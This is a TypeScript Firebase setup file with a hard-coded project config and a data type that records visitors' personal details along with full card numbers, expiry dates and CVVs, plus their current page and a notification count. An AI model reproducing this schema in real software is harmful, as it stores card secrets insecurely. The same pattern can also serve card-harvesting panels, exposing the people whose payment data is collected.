import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyApD3fjhn3FxxC6AKwnZLEHe4hIYzMxeUo",
  authDomain: "zain0-1.firebaseapp.com",
  databaseURL: "https://zain0-1-default-rtdb.firebaseio.com",
  projectId: "zain0-1",
  storageBucket: "zain0-1.firebasestorage.app",
  messagingSenderId: "662580050481",
  appId: "1:662580050481:web:d9b76049895848b69e7310",
  measurementId: "G-T80Y652HR2"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
